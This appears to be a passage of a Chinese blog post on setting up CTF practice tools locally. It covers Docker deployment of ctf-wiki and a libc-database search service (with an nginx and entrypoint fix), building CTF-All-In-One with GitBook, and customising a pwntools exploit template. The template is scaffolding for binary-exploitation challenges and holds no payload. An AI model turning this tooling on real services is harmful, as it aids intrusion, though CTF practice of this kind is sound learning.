<h2 id="ctf-wiki本地搭建"><a href="#ctf-wiki本地搭建" class="headerlink" title="ctf-wiki本地搭建"></a>ctf-wiki本地搭建</h2><p>作为一个不是啥都熟的选手，ctf-wiki还是必备的，打比赛的时候查查exp，查查用法什么都好</p>
<h3 id="首先安装docker"><a href="#首先安装docker" class="headerlink" title="首先安装docker"></a>首先安装docker</h3><p>这个不讲了</p>
<h3 id="docker-pull镜像"><a href="#docker-pull镜像" class="headerlink" title="docker pull镜像"></a>docker pull镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ctf  <span class="comment">#先查找镜像，镜像名知道可以不查找</span></span><br><span class="line">docker pull ctfwiki/ctf-wiki <span class="comment">#pull ctfwiki镜像</span></span><br><span class="line">docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki <span class="comment">#-d参数为后台运行，--name为名称 -p为端口映射 4100是本地端口，80是docker端口</span></span><br></pre></td></tr></table></figure>


<h2 id="部署libc-database"><a href="#部署libc-database" class="headerlink" title="部署libc-database"></a>部署libc-database</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull blukat29/libc</span><br><span class="line">docker run -p 4101:80 -d blukat29/libc</span><br></pre></td></tr></table></figure>
<p>配置文件目录/etc/nginx/conf.d/nginx.conf<br>启动端口在4101,这里有个小问题，就是无法下载，解决方法，替换nginx的配置文件为如下</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="variable">@app</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /static &#123;</span><br><span class="line">        <span class="attribute">alias</span> /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /d &#123;</span><br><span class="line">        <span class="attribute">alias</span> /libc-database/db;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.symbols$</span> &#123;</span><br><span class="line">            <span class="attribute">default_type</span> text/plain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最主要是</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /d &#123;</span><br><span class="line">    <span class="attribute">alias</span> /libc-database/db;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.symbols$</span> &#123;</span><br><span class="line">        <span class="attribute">default_type</span> text/plain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后发觉每次重启都会他配置文件都会重置，研究下了他docker里的东西，发觉是entrypoint.sh影响了，所以修改下entrypoint.sh就行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/env bash</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="comment"># Get the maximum upload file size for Nginx, default to 0: unlimited</span></span><br><span class="line">USE_NGINX_MAX_UPLOAD=<span class="variable">$&#123;NGINX_MAX_UPLOAD:-0&#125;</span></span><br><span class="line"><span class="comment"># Generate Nginx config for maximum upload file size</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"client_max_body_size <span class="variable">$USE_NGINX_MAX_UPLOAD</span>;"</span> &gt; /etc/nginx/conf.d/upload.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the number of workers for Nginx, default to 1</span></span><br><span class="line">USE_NGINX_WORKER_PROCESSES=<span class="variable">$&#123;NGINX_WORKER_PROCESSES:-1&#125;</span></span><br><span class="line"><span class="comment"># Modify the number of worker processes in Nginx config</span></span><br><span class="line">sed -i <span class="string">"/worker_processes\s/c\worker_processes <span class="variable">$&#123;USE_NGINX_WORKER_PROCESSES&#125;</span>;"</span> /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the URL for static files from the environment variable</span></span><br><span class="line">USE_STATIC_URL=<span class="variable">$&#123;STATIC_URL:-'/static'&#125;</span></span><br><span class="line"><span class="comment"># Get the absolute path of the static files from the environment variable</span></span><br><span class="line">USE_STATIC_PATH=<span class="variable">$&#123;STATIC_PATH:-'/app/static'&#125;</span></span><br><span class="line"><span class="comment"># Get the listen port for Nginx, default to 80</span></span><br><span class="line">USE_LISTEN_PORT=<span class="variable">$&#123;LISTEN_PORT:-80&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate Nginx config first part using the environment variables</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"server &#123;</span></span><br><span class="line"><span class="string">    listen 80;</span></span><br><span class="line"><span class="string">    location / &#123;</span></span><br><span class="line"><span class="string">        try_files \$uri @app;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location @app &#123;</span></span><br><span class="line"><span class="string">        include uwsgi_params;</span></span><br><span class="line"><span class="string">        uwsgi_param Host \$host;</span></span><br><span class="line"><span class="string">        uwsgi_param X-Real-IP \$remote_addr;</span></span><br><span class="line"><span class="string">        uwsgi_param X-Forwarded-For \$proxy_add_x_forwarded_for;</span></span><br><span class="line"><span class="string">        uwsgi_pass unix:///tmp/uwsgi.sock;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location /static &#123;</span></span><br><span class="line"><span class="string">        alias /app/static;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location /d &#123;</span></span><br><span class="line"><span class="string">        alias /libc-database/db;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        location ~ \.symbols$ &#123;</span></span><br><span class="line"><span class="string">            default_type text/plain;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;"</span> &gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># If STATIC_INDEX is 1, serve / with /static/index.html directly (or the static URL configured)</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$STATIC_INDEX</span> == 1 ]] ; <span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"    location = / &#123;</span></span><br><span class="line"><span class="string">        index <span class="variable">$USE_STATIC_URL</span>/index.html;</span></span><br><span class="line"><span class="string">    &#125;"</span> &gt;&gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># Finish the Nginx config file</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&#125;"</span> &gt;&gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></table></figure>
<p>然后就部署完成了,如果还嫌麻烦，可以用下我这个Dockerfile<br><a href="https://github.com/qq1270287245/libcsearcher" target="_blank" rel="noopener">项目地址</a><br>用法在项目里已经说明了，只是修改了一点点错误</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>libc database search<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for('static', filename='style.css') &#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://code.jquery.com/ui/1.12.1/themes/start/jquery-ui.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='bootstrap.min.js') &#125;&#125;"</span> <span class="attr">integrity</span>=<span class="string">"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='jquery-ui.min.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='URI.min.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pull-right"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            View source <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/blukat29/search-libc"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            Powered by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/niklasb/libc-database"</span>&gt;</span>libc-database<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>libc database search<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-6"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title panel-title-inline"</span>&gt;</span>Query<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"panel-title-right"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?q=_rtld_global%3A0"</span>&gt;</span>show all libs<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                /</span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>start over<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"queries"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-inline"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"query-add"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"query-find"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Find<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-6"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          &#123;% if libs %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title"</span>&gt;</span>Matches<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              &#123;% for lib_name in libs %&#125;</span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"lib-item &#123;&#123; 'active' if lib_name == lib &#125;&#125;"</span>&gt;</span></span><br><span class="line">                  &#123;&#123; lib_name &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">          &#123;% if symbols %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title panel-title-inline"</span>&gt;</span>&#123;&#123; lib &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"panel-title-right"</span> <span class="attr">href</span>=<span class="string">"/d/&#123;&#123; lib &#125;&#125;.so"</span>&gt;</span>Download<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-condensed table-hover"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Symbol<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Offset<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Difference<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% for name, ofs in symbols %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">"mono-font symbol-row"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose-base"</span> <span class="attr">class</span>=<span class="string">"symbol-radio"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-name"</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-ofs"</span>&gt;</span>&#123;&#123; '0x%06x' | format(ofs) &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-diff"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">              <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"/d/&#123;&#123; lib &#125;&#125;.symbols"</span>&gt;</span>All symbols<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>Database updated on May 23, 2018.<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='main.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    &#123;% <span class="keyword">for</span> name, addr <span class="keyword">in</span> query.items() %&#125;</span></span><br><span class="line"><span class="actionscript">    add_query(<span class="string">"&#123;&#123; name &#125;&#125;"</span>, <span class="string">"&#123;&#123; addr &#125;&#125;"</span>);</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='names.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    set_autocomplete(names);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="本地搭建ctf-all-in-one"><a href="#本地搭建ctf-all-in-one" class="headerlink" title="本地搭建ctf-all-in-one"></a>本地搭建ctf-all-in-one</h2><p><a href="https://github.com/firmianay/CTF-All-In-One" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One</a></p>
<h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><p>git clone <a href="https://github.com/firmianay/CTF-All-In-One" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One</a></p>
<h3 id="GitBook基础"><a href="#GitBook基础" class="headerlink" title="GitBook基础"></a>GitBook基础</h3><p>README.md和SUMMARY.md<br>必备文件</p>
<h3 id="利用Docker安装Gitbook"><a href="#利用Docker安装Gitbook" class="headerlink" title="利用Docker安装Gitbook"></a>利用Docker安装Gitbook</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search gitbook <span class="comment">#可以查看，我用了最高星的那个</span></span><br><span class="line">docker pull fellah/gitbook</span><br></pre></td></tr></table></figure>

<p>先到项目的目录下<br>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v <span class="variable">$PWD</span>:/srv/gitbook -v <span class="variable">$PWD</span>/html:/srv/html fellah/gitbook gitbook build . /srv/html</span><br></pre></td></tr></table></figure>
<h3 id="展示Gitbook文件"><a href="#展示Gitbook文件" class="headerlink" title="展示Gitbook文件"></a>展示Gitbook文件</h3><p>因为生成的是html静态页面所以需要一个web服务来显示，我用nginx</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br><span class="line">docker run --name ctf-all-in-one -v /<span class="variable">$PWD</span>/html:/usr/share/nginx/html -d -p 4102:80 nginx</span><br></pre></td></tr></table></figure>
<p>这样就搭建完成了</p>
<p>访问你自己的4100-4102端口看下，是否成功了</p>
<h3 id="下载ctf-challenge，例题以及exp"><a href="#下载ctf-challenge，例题以及exp" class="headerlink" title="下载ctf-challenge，例题以及exp"></a>下载ctf-challenge，例题以及exp</h3><p>git clone <a href="https://github.com/ctf-wiki/ctf-challenges" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges</a><br>这个说不定哪天就用上了，说不准</p>
<h2 id="exp模板构建"><a href="#exp模板构建" class="headerlink" title="exp模板构建"></a>exp模板构建</h2><p>因为要快速做题，每次重复的部分整合起来比较好，所以便研究下exp模板如何弄，我是通过修改pwntools里自带的exp模板，生成自己专属的模板的，我建议都弄成自己的exp模板类型吧，因为每个人代码风格不一样，没必要一定用大佬的模板，当然有可能大佬的模板好，但不一定适合自己</p>
<h3 id="模板位置"><a href="#模板位置" class="headerlink" title="模板位置"></a>模板位置</h3><p>第一个是模板的具体内容，第二个是生成模板的方法</p>
<ul>
<li>pwnup.mako</li>
<li>template.py</li>
</ul>
<p>你可以find / -name 名称<br>找到具体位置，最好先备份一份</p>
<p>具体配置自行配置，因为每个人风格不同</p>
<h3 id="pwntools-exp模板自定义"><a href="#pwntools-exp模板自定义" class="headerlink" title="pwntools exp模板自定义"></a>pwntools exp模板自定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%page args=<span class="string">"binary, host=None, port=None, libc=None, local=True"</span>/&gt;\</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.context <span class="keyword">import</span> context <span class="keyword">as</span> ctx</span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.sh_string <span class="keyword">import</span> sh_string</span><br><span class="line"><span class="keyword">from</span> elftools.common.exceptions <span class="keyword">import</span> ELFError</span><br><span class="line"></span><br><span class="line">argv = list(sys.argv)</span><br><span class="line">argv[<span class="number">0</span>] = os.path.basename(argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> binary:</span><br><span class="line">       ctx.binary = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> ELFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> binary:</span><br><span class="line">    binary = <span class="string">'/path/to/binary'</span></span><br><span class="line"></span><br><span class="line">exe = os.path.basename(binary)</span><br><span class="line"><span class="keyword">if</span> binary[<span class="number">0</span>] != <span class="string">'/'</span>:</span><br><span class="line">    binary = <span class="string">"./"</span> + binary</span><br><span class="line">binary_repr = repr(binary)</span><br><span class="line">libc_repr = repr(libc)</span><br><span class="line">%&gt;\</span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">%<span class="keyword">if</span> host:</span><br><span class="line">host = args.HOST <span class="keyword">or</span> $&#123;repr(host)&#125;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">%endif</span><br><span class="line">%<span class="keyword">if</span> port:</span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> $&#123;port&#125;)</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">%endif</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">%<span class="keyword">if</span> ctx.binary:</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe.path'</span> %&gt;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>)</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe'</span> %&gt;</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : 